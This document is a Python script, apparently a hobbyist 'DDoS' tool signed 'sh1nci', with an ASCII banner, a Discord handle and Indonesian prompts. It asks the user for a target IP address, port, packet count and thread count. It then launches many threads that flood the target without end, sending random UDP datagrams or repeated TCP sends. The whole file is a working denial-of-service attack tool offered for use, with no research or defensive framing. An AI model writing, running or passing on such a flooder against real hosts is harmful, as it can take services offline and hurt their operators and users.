#!/usr/bin/env python3
#Ddos by sh1nci
import random
import socket
import threading
import os

os.system("clear")
print("███████╗██╗  ██╗ ██╗███╗   ██╗ ██████╗██╗")
print("██╔════╝██║  ██║███║████╗  ██║██╔════╝██║")
print("███████╗███████║╚██║██╔██╗ ██║██║     ██║")
print("╚════██║██╔══██║ ██║██║╚██╗██║██║     ██║")
print("███████║██║  ██║ ██║██║ ╚████║╚██████╗██║")
print("╚══════╝╚═╝  ╚═╝ ╚═╝╚═╝  ╚═══╝ ╚═════╝╚═╝")
                                         

print("------------------------------------------------------------")
print(" » My Discord Sh1nci#683dua5 «")
print(" »      Fuck You Your Abuse           «")
print(" »   TOOLS BY SH1NCI!       «")
print("------------------------------------------------------------")
ip = str(input(" Ip Target:"))
port = int(input(" Port Target:"))
choice = str(input(" Gas Attack Gak Nih?(y/n):"))
times = int(input(" Packets:"))
threads = int(input(" Threads:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Sh1nci Sedang Menyenggol ")
		except:
			print("[!] SH1NCI IS HERE BRO! ")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Sh1nci Sedang Menyenggol ")
		except:
			s.close()
			print("[*] SH1NCI IS HERE BRO! ")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()